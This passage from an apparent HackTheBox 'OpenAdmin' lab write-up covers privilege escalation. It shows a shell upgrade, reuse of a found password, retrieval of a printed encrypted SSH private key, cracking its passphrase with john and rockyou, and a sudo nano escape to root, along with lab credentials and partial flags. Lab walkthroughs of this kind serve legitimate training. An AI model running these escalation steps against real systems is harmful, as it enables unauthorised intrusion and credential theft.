<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ bash linenum.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Users that have previously logged onto the system:</span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root             tty1                      Sat Jan  4 21:23:05 +0000 2020</span><br><span class="line">jimmy            pts/11   10.10.15.3       Sun May  3 20:41:37 +0000 2020</span><br><span class="line">joanna           pts/10   10.10.15.142     Sun May  3 19:20:25 +0000 2020</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>i switch first to user <code>jimmy</code> and tried the password I found, and it’s work !</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">www-data@openadmin:/tmp$ su jimmy</span><br><span class="line">su jimmy</span><br><span class="line">Password: n1nj4W4rri0R!</span><br><span class="line"></span><br><span class="line">jimmy@openadmin:/tmp$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">jimmy@openadmin:/home$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">jimmy  joanna</span><br><span class="line">jimmy@openadmin:/home$ <span class="built_in">cd</span> jimmy</span><br><span class="line"><span class="built_in">cd</span> jimmy</span><br><span class="line">jimmy@openadmin:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>But still <code>user.txt</code> isn’t available for this user so I need to escalate <code>joanna</code>, I go back on the <code>/var/www/</code> directory and there was a internal site which has help me a lot :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">jimmy@openadmin:~$ <span class="built_in">cd</span> /var/www</span><br><span class="line"><span class="built_in">cd</span> /var/www</span><br><span class="line">jimmy@openadmin:/var/www$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">html  internal  ona</span><br><span class="line">jimmy@openadmin:/var/www$ <span class="built_in">cd</span> internal</span><br><span class="line"><span class="built_in">cd</span> internal</span><br><span class="line">jimmy@openadmin:/var/www/internal$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">a.php  index.php  logout.php  main.php</span><br><span class="line">jimmy@openadmin:/var/www/internal$</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h3><p>base <code>main.php</code> file there’s a <code>ssh key</code> home directory of <code>joanna</code>. It is prompts the <code>jimmy</code> user to output the rsa key of another user joanna through login authentication. Now we need to know which port this service is running on :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">jimmy@openadmin:/var/www/internal$ netstat -tulpn</span><br><span class="line">netstat -tulpn</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -                   </span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   </span><br><span class="line">jimmy@openadmin:/var/www/internal$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>So there’s a port <code>52846</code> running on a localhost i <code>curl</code> the site if i can get the <code>RSA Keys</code> and there is :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">jimmy@openadmin:/var/www/internal$ curl http://localhost:52846/main.php</span><br><span class="line">curl http://localhost:52846/main.php</span><br><span class="line">&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE</span><br><span class="line">6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ</span><br><span class="line">ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du</span><br><span class="line">y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI</span><br><span class="line">9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4</span><br><span class="line">piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/</span><br><span class="line">/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH</span><br><span class="line">40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ</span><br><span class="line">fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb</span><br><span class="line">9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80</span><br><span class="line">X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg</span><br><span class="line">S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F</span><br><span class="line">FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh</span><br><span class="line">Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa</span><br><span class="line">RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z</span><br><span class="line">uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr</span><br><span class="line">1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2</span><br><span class="line">XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79</span><br><span class="line">yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM</span><br><span class="line">+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt</span><br><span class="line">qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line">&lt;/pre&gt;&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don<span class="string">&#x27;t forget your &quot;ninja&quot; password&lt;/h3&gt;</span></span><br><span class="line"><span class="string">Click here to logout &lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&gt;Session</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">jimmy@openadmin:/var/www/internal$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>I copy the <code>RSA Key</code> on my Kali then decrypt it with <code>ssh2john</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via 🐘 v7.3.15 via 🐍 v3.8.2 </span><br><span class="line">❯ ./ssh2john.py id_rsa &gt; rsa.hash</span><br><span class="line">./ssh2john.py:103: DeprecationWarning: decodestring() is a deprecated <span class="built_in">alias</span> since Python 3.1, use decodebytes()</span><br><span class="line">  data = base64.decodestring(data)</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via 🐘 v7.3.15 via 🐍 v3.8.2 </span><br><span class="line">❯ <span class="built_in">ls</span></span><br><span class="line">exploit.sh  file-write  id_rsa  LinEnum.sh  nmap-OpenAdmin  rsa.hash  shell.php  ssh2john.py</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via 🐘 v7.3.15 via 🐍 v3.8.2 </span><br><span class="line">❯ <span class="built_in">cat</span> rsa.hash </span><br><span class="line">id_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200<span class="variable">$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via 🐘 v7.3.15 via 🐍 v3.8.2 </span><br><span class="line">❯</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>after getting the hash now it’s time cracked it with <code>john</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via 🐘 v7.3.15 via 🐍 v3.8.2 </span><br><span class="line">❯ john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">bloodninjas      (id_rsa)</span><br><span class="line">1g 0:00:00:12 92.93% (ETA: 05:02:34) 0.08319g/s 1114Kp/s 1114Kc/s 1114KC/s 11235813211618..11235655</span><br><span class="line">Warning: Only 2 candidates left, minimum 4 needed <span class="keyword">for</span> performance.</span><br><span class="line">1g 0:00:00:13 DONE (2020-05-04 05:02) 0.07358g/s 1055Kp/s 1055Kc/s 1055KC/sa6_123..*7¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via 🐘 v7.3.15 via 🐍 v3.8.2 took 18s </span><br><span class="line">❯ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>then finally i can login as user <code>joanna</code> with passphrase <code>bloodninjas</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via 🐘 v7.3.15 via 🐍 v3.8.2 </span><br><span class="line">❯ ssh -v -i id_rsa joanna@10.10.10.171</span><br><span class="line">OpenSSH_8.2p1 Debian-4, OpenSSL 1.1.1g  21 Apr 2020</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files</span><br><span class="line">debug1: /etc/ssh/ssh_config line 21: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to 10.10.10.171 [10.10.10.171] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file id_rsa <span class="built_in">type</span> -1</span><br><span class="line">debug1: identity file id_rsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_8.2p1 Debian-4</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.3</span><br><span class="line">debug1: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002</span><br><span class="line">debug1: Authenticating to 10.10.10.171:22 as <span class="string">&#x27;joanna&#x27;</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ecdsa-sha2-nistp256</span><br><span class="line">debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ecdsa-sha2-nistp256 SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY</span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.171 (10.10.10.171)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.171<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">debug1: rekey out after 134217728 blocks</span></span><br><span class="line"><span class="string">debug1: SSH2_MSG_NEWKEYS sent</span></span><br><span class="line"><span class="string">debug1: expecting SSH2_MSG_NEWKEYS</span></span><br><span class="line"><span class="string">debug1: SSH2_MSG_NEWKEYS received</span></span><br><span class="line"><span class="string">debug1: rekey in after 134217728 blocks</span></span><br><span class="line"><span class="string">debug1: Will attempt key: id_rsa  explicit</span></span><br><span class="line"><span class="string">debug1: SSH2_MSG_EXT_INFO received</span></span><br><span class="line"><span class="string">debug1: kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span></span><br><span class="line"><span class="string">debug1: SSH2_MSG_SERVICE_ACCEPT received</span></span><br><span class="line"><span class="string">debug1: Authentications that can continue: publickey,password</span></span><br><span class="line"><span class="string">debug1: Next authentication method: publickey</span></span><br><span class="line"><span class="string">debug1: Trying private key: id_rsa</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">debug1: Authentication succeeded (publickey).</span></span><br><span class="line"><span class="string">Authenticated to 10.10.10.171 ([10.10.10.171]:22).</span></span><br><span class="line"><span class="string">debug1: channel 0: new [client-session]</span></span><br><span class="line"><span class="string">debug1: Requesting no-more-sessions@openssh.com</span></span><br><span class="line"><span class="string">debug1: Entering interactive session.</span></span><br><span class="line"><span class="string">debug1: pledge: network</span></span><br><span class="line"><span class="string">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span></span><br><span class="line"><span class="string">debug1: Sending environment.</span></span><br><span class="line"><span class="string">debug1: Sending env LANG = en_US.utf8</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Sun May  3 21:27:30 UTC 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0               Processes:             115</span></span><br><span class="line"><span class="string">  Usage of /:   49.3% of 7.81GB   Users logged in:       0</span></span><br><span class="line"><span class="string">  Memory usage: 18%               IP address for ens160: 10.10.10.171</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">41 packages can be updated.</span></span><br><span class="line"><span class="string">12 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3</span></span><br><span class="line"><span class="string">joanna@openadmin:~$</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>and get the <code>user.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">joanna@openadmin:~$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">joanna@openadmin:~$ <span class="built_in">wc</span> -c user.txt</span><br><span class="line">33 user.txt</span><br><span class="line">33 total</span><br><span class="line">joanna@openadmin:~$ <span class="built_in">cut</span> -c 1-12 user.txt</span><br><span class="line">c9b2cf07d408</span><br><span class="line">joanna@openadmin:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h3><p>Going to <code>root</code> is very straight forward running <code>sudo -l</code> we can see that the user <code>Joanna</code> can run as the root user <code>/bin/nano /opt/priv</code> without entering a password.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">joanna@openadmin:/$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> joanna on openadmin:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User joanna may run the following commands on openadmin:</span><br><span class="line">    (ALL) NOPASSWD: /bin/nano /opt/priv</span><br><span class="line"></span><br><span class="line">joanna@openadmin:/$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>base on <code>#GTFObins</code> It can be used to break out from restricted environments by spawning an interactive system shell. just run <code>nano</code> then <code>ctrl+R</code>-&gt; <code>ctrl+X</code> then execute a command <code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code> then u have finally a shell.</p>
<p><img src="/img/openA/openA-nano.PNG" alt="HackTheBox-OpenAdmin" title="Root Nano"></p>
<p>so it’s time to do exploitation</p>
<p><img src="/img/openA/openA-root.png" alt="HackTheBox-OpenAdmin" title="Root Nano"></p>
<p>after executing finally I got the administrator shell <code>root</code> and get the <code>user.txt</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>get proper shell as <code>root</code> :</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /bin/bash -i</span></span><br><span class="line">root@openadmin:~# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@openadmin:~# <span class="built_in">cd</span> /root</span><br><span class="line">root@openadmin:/root# <span class="built_in">ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@openadmin:/root# <span class="built_in">wc</span> -c root.txt</span><br><span class="line">33 root.txt</span><br><span class="line">root@openadmin:/root# <span class="built_in">cut</span> -c 1-12 root.txt</span><br><span class="line">2f907ed450b3</span><br><span class="line">root@openadmin:/root#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>If you liked my writeup please leave a respect on my <a target="_blank" rel="noopener" href="https://www.hackthebox.eu/profile/128965">Profile</a></p>
<p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p>
<hr>
<p>Referrences:</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47691">OpenNetAdmin RCE at v18.1.1 Exploit</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nano/">GTFObins - Nano</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenAdmin-website"><span class="toc-number">4.1.</span> <span class="toc-text">OpenAdmin website</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fuzzing"><span class="toc-number">4.2.</span> <span class="toc-text">Fuzzing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Identify-vulnerabilities"><span class="toc-number">5.1.</span> <span class="toc-text">Identify vulnerabilities</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-or-Remote-Code-Execution"><span class="toc-number">5.2.</span> <span class="toc-text">RCE or Remote Code Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerate-web-configuration"><span class="toc-number">5.3.</span> <span class="toc-text">Enumerate web configuration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-a-proper-shell"><span class="toc-number">6.1.</span> <span class="toc-text">Get a proper shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-1"><span class="toc-number">7.1.</span> <span class="toc-text">Phase 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-2"><span class="toc-number">7.2.</span> <span class="toc-text">Phase 2</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&text=HackTheBox - OpenAdmin 📦"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&title=HackTheBox - OpenAdmin 📦"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-05-03/HackTheBox/PenTesting/HackTheBox-OpenAdmin/&is_video=false&description=HackTheBox - OpenAdmin 📦"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
